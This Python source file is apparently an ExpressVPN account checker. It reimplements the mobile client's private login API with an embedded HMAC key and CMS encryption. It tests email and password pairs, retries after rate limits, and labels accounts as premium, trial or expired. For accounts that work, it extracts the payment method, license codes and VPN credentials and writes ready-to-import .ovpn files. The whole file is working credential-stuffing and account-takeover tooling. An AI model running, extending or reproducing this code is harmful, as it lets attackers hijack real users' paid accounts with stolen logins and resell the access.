import os
import json
import base64
import gzip
import hmac
import hashlib
import random
import string
import re
import time
from datetime import datetime
from typing import Dict, Any
import requests
import urllib3

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography import x509 as crypto_x509
from asn1crypto import core, x509

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ====================== OVPN CONFIG GENERATOR (Exact Go style) ======================
ovpn_cablock = """-----BEGIN CERTIFICATE-----
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
-----END CERTIFICATE-----
"""

def generate_ovpn_config(email: str, data: dict, hostname: str = None) -> str:
    """Exactly matches Go's ovpnConfig"""
    if not hostname:
        hostname = "usa-newyork-ca-version-2.expressnetw.com"

    # Nice auto-renew display
    auto_renew_str = "Yes" if data.get('auto_renew') else "No"

    server_comment = f"# Server:  USA / New York\n"

    return f"""client
dev tun
proto udp
remote {hostname} 1195
remote {hostname} 443 tcp
remote-random
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
setenv CLIENT_CERT 0
auth-nocache
cipher AES-256-CBC
auth SHA512
verb 3
# Account:  {email}
# Plan:     {data.get('plan', 'Unknown')}  |  Expires: {data.get('expire_date', 'N/A')}  |  Auto-Renew: {auto_renew_str}
{server_comment}<auth-user-pass>
{data.get('ovpn_user', 'N/A')}
{data.get('ovpn_pass', 'N/A')}
</auth-user-pass>
<ca>
{ovpn_cablock}
</ca>
"""

def save_ovpn_file(email: str, data: dict) -> str | None:
    """Save ready-to-import .ovpn file"""
    try:
        os.makedirs("ovpns", exist_ok=True)
        safe_email = "".join(c if c.isalnum() or c in "@._-" else "_" for c in email)
        filepath = f"ovpns/ExpressVPN - {safe_email} By @caydigitals.ovpn"

        config = generate_ovpn_config(email, data)
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(config)

        print(f"✅ OVPN saved: {filepath}")
        return filepath
    except Exception as e:
        print(f"❌ Failed to save OVPN: {e}")
        return None

class CryptoHelper:
    @staticmethod
    def get_byte_array(size: int) -> bytes:
        return os.urandom(size)

    @staticmethod
    def compute_signature(data: bytes, key: bytes) -> str:
        return base64.b64encode(hmac.new(key, data, hashlib.sha1).digest()).decode('ascii')

    @staticmethod
    def gzip_data(input_str: str) -> bytes:
        return gzip.compress(input_str.encode('ascii'), compresslevel=9)

    # ====================== EXACT GO PORT (TripleDES + TLV) ======================
    @staticmethod
    def build_tlv(class_val: int, tag: int, compound: bool, content: bytes) -> bytes:
        tag_byte = (class_val << 6) | (tag & 0x1f)
        if compound:
            tag_byte |= 0x20
        out = bytes([tag_byte])
        n = len(content)
        if n < 128:
            len_bytes = bytes([n])
        elif n < 256:
            len_bytes = bytes([0x81, n])
        elif n < 65536:
            len_bytes = bytes([0x82, (n >> 8) & 0xff, n & 0xff])
        else:
            len_bytes = bytes([0x83, (n >> 16) & 0xff, (n >> 8) & 0xff, n & 0xff])
        return out + len_bytes + content

    @staticmethod
    def build_seq(content: bytes) -> bytes:
        return CryptoHelper.build_tlv(0, 16, True, content)

    @staticmethod
    def build_set(content: bytes) -> bytes:
        return CryptoHelper.build_tlv(0, 17, True, content)

    @staticmethod
    def build_oid(oid: list) -> bytes:
        dotted = ".".join(str(x) for x in oid)
        return core.ObjectIdentifier(dotted).dump()

    @staticmethod
    def build_int(n: int) -> bytes:
        return core.Integer(n).dump()

    @staticmethod
    def build_octet(data: bytes) -> bytes:
        return CryptoHelper.build_tlv(0, 4, False, data)

    @staticmethod
    def build_null() -> bytes:
        return bytes([0x05, 0x00])

    @staticmethod
    def envelope_encrypt(input_data: bytes, cert_base64: str) -> bytes:
        """Exact byte-for-byte port of Go's envelopeEncrypt (TripleDES + correct CMS)"""
        cert_der = base64.b64decode("".join(cert_base64.split()))

        content_key = CryptoHelper.get_byte_array(24)
        content_iv = CryptoHelper.get_byte_array(8)

        pad_len = 8 - (len(input_data) % 8)
        if pad_len == 0:
            pad_len = 8
        padded = input_data + bytes([pad_len] * pad_len)

        cipher = Cipher(algorithms.TripleDES(content_key), modes.CBC(content_iv))
        encryptor = cipher.encryptor()
        enc_content = encryptor.update(padded) + encryptor.finalize()

        crypto_cert = crypto_x509.load_der_x509_certificate(cert_der)
        public_key = crypto_cert.public_key()
        enc_key = public_key.encrypt(content_key, asym_padding.PKCS1v15())

        asn_cert = x509.Certificate.load(cert_der)
        tbs = asn_cert['tbs_certificate']

        issuer_serial = CryptoHelper.build_seq(tbs['issuer'].dump() + tbs['serial_number'].dump())
        rsa_alg_id = CryptoHelper.build_seq(
            CryptoHelper.build_oid([1, 2, 840, 113549, 1, 1, 1]) + CryptoHelper.build_null()
        )

        ktri_body = CryptoHelper.build_int(0) + issuer_serial + rsa_alg_id + CryptoHelper.build_octet(enc_key)
        ktri_der = CryptoHelper.build_seq(ktri_body)
        recipient_infos = CryptoHelper.build_set(ktri_der)

        des_alg_id = CryptoHelper.build_seq(
            CryptoHelper.build_oid([1, 2, 840, 113549, 3, 7]) + CryptoHelper.build_octet(content_iv)
        )

        eci_body = CryptoHelper.build_oid([1, 2, 840, 113549, 1, 7, 1]) + des_alg_id + CryptoHelper.build_tlv(2, 0, False, enc_content)
        eci_der = CryptoHelper.build_seq(eci_body)

        ev_body = CryptoHelper.build_int(0) + recipient_infos + eci_der
        ev_der = CryptoHelper.build_seq(ev_body)

        ci_body = CryptoHelper.build_oid([1, 2, 840, 113549, 1, 7, 3]) + CryptoHelper.build_tlv(2, 0, True, ev_der)
        return CryptoHelper.build_seq(ci_body)

class ExpressVPNChecker:
    def __init__(self):
        self.cert_base64 = "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
        self.hmac_key = b"@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"

    def generate_install_id(self) -> str:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=64))

    def check_account(self, email: str, password: str) -> Dict[str, Any]:
        result = {
            'email': email,
            'password': password,
            'status': 'FAIL',
            'data': {},
            'error': None,
            'ovpn_path': None
        }

        for attempt in range(4):
            try:
                # === Request & Crypto (your code is correct here) ===
                iv = CryptoHelper.get_byte_array(16)
                key = CryptoHelper.get_byte_array(16)
                install_id = self.generate_install_id()

                post_data = json.dumps({
                    "email": email,
                    "iv": base64.b64encode(iv).decode('ascii'),
                    "key": base64.b64encode(key).decode('ascii'),
                    "password": password
                })

                gzipped = CryptoHelper.gzip_data(post_data)
                encrypted_post = CryptoHelper.envelope_encrypt(gzipped, self.cert_base64)

                query = f"client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
                header_raw = f"POST /apis/v2/credentials?{query}"
                header_sig = CryptoHelper.compute_signature(header_raw.encode('ascii'), self.hmac_key)
                body_sig = CryptoHelper.compute_signature(encrypted_post, self.hmac_key)

                session = requests.Session()
                session.headers.update({
                    'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2',
                    'Content-Type': 'application/octet-stream',
                    'X-Body-Compression': 'gzip',
                    'X-Signature': f'2 {header_sig} 91c776e',
                    'X-Body-Signature': f'2 {body_sig} 91c776e',
                    'Accept-Language': 'en'
                })

                resp = session.post(f"https://www.expressapisv2.net/apis/v2/credentials?{query}",
                                    data=encrypted_post, timeout=25, verify=False)

                if resp.status_code == 429:
                    time.sleep(1.2)
                    continue
                if resp.status_code in (401, 400):
                    result['status'] = 'INVALID'
                    return result
                if resp.status_code != 200:
                    continue

                # Decryption
                try:
                    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
                    decryptor = cipher.decryptor()
                    decrypted = decryptor.update(resp.content) + decryptor.finalize()
                    pad = decrypted[-1]
                    decrypted = decrypted[:-pad]
                    body = decrypted.decode('utf-8', errors='ignore')
                except Exception:
                    result['status'] = 'ERROR'
                    return result

                # Parse tokens
                access_token_match = re.search(r'"access_token":"([^"]+)"', body)
                if not access_token_match:
                    result['status'] = 'INVALID'
                    return result

                ovpn_user = re.search(r'"ovpn_username":"([^"]+)"', body).group(1)
                ovpn_pass = re.search(r'"ovpn_password":"([^"]+)"', body).group(1)
                pptp_user = re.search(r'"pptp_username":"([^"]+)"', body).group(1)
                pptp_pass = re.search(r'"pptp_password":"([^"]+)"', body).group(1)

                # Batch Subscription Check
                sub_raw = f"GET /apis/v2/subscription?access_token={access_token_match.group(1)}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"
                sub_sig = CryptoHelper.compute_signature(sub_raw.encode('ascii'), self.hmac_key)

                batch_raw = f"POST /apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
                batch_sig = CryptoHelper.compute_signature(batch_raw.encode('ascii'), self.hmac_key)

                capture_body = f'[{{"headers":{{"Accept-Language":"en","X-Signature":"2 {sub_sig} 91c776e"}},"method":"GET","url":"/apis/v2/subscription?access_token={access_token_match.group(1)}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"}}]'
                capture_sig = CryptoHelper.compute_signature(capture_body.encode('ascii'), self.hmac_key)

                batch_resp = session.post(
                    f"https://www.expressapisv2.net/apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4",
                    data=capture_body,
                    headers={
                        'X-Body-Compression': 'gzip',
                        'X-Signature': f'2 {batch_sig} 91c776e',
                        'X-Body-Signature': f'2 {capture_sig} 91c776e',
                        'Accept-Language': 'en'
                    },
                    timeout=20,
                    verify=False
                )

                if 'subscription' not in batch_resp.text or 'REVOKED' in batch_resp.text or '"status":""' in batch_resp.text:
                    result['status'] = 'EXPIRED'
                    return result

                # Go-style status detection
                unescaped = batch_resp.text.encode().decode('unicode_escape')
                license_status = "UNKNOWN"
                ls_match = re.search(r'"license_status":"([^"]+)"', unescaped)
                if ls_match:
                    license_status = ls_match.group(1).upper()

                exp_match = re.search(r'expiration_time":(\d+)', unescaped)
                expiration = int(exp_match.group(1)) if exp_match else 0
                is_active = expiration > time.time()

                if license_status == "REVOKED":
                    final_status = "FREE"
                elif license_status == "TRIAL" and is_active:
                    final_status = "TRIAL"
                elif license_status in ("ACTIVE", "PAID") and is_active:
                    final_status = "PREMIUM"
                else:
                    final_status = "EXPIRED"

                # Parse other fields
                plan_match = re.search(r'billing_cycle":(\d+)', unescaped)
                plan = f"{plan_match.group(1)} Month" if plan_match else "Unknown"
                auto_renew_match = re.search(r'auto_bill":([^,]+)', unescaped)
                auto_renew = auto_renew_match.group(1) if auto_renew_match else "false"
                days_left = round((expiration - time.time()) / 86400) if expiration > time.time() else 0
                expire_date = datetime.fromtimestamp(expiration).strftime('%Y-%m-%d') if expiration else 'N/A'
                payment_match = re.search(r'payment_method":"([^"]+)"', unescaped)
                payment = payment_match.group(1) if payment_match else "Unknown"

                # License code
                license_code = "N/A"
                try:
                    web_headers = {'authorization': f'Bearer {access_token_match.group(1)}', 'User-Agent': 'Mozilla/5.0'}
                    web_resp = session.get('https://www.expressvpn.com/api/v2/subscriptions', headers=web_headers, timeout=15, verify=False)
                    licenses = re.findall(r'longCode":"([^"]+)"', web_resp.text)
                    license_code = licenses[-1] if licenses else "N/A"
                except:
                    pass

                session.close()

                # Final structured result
                result['status'] = final_status
                result['data'] = {
                    'plan': plan,
                    'expire_date': expire_date,
                    'days_left': days_left,
                    'auto_renew': auto_renew == 'true',
                    'payment_method': payment,
                    'license': license_code,
                    'ovpn_user': ovpn_user,
                    'ovpn_pass': ovpn_pass,
                    'pptp_user': pptp_user,
                    'pptp_pass': pptp_pass,
                    'license_status': license_status
                }

                # Auto save OVPN on successful hit
                if final_status in ("PREMIUM", "TRIAL"):
                    ovpn_path = save_ovpn_file(email, result['data'])
                    if ovpn_path:
                        result['ovpn_path'] = ovpn_path

                return result

            except Exception as e:
                result['error'] = str(e)[:150]
                if "429" in str(e):
                    time.sleep(1.5)
                    continue
                break

        return result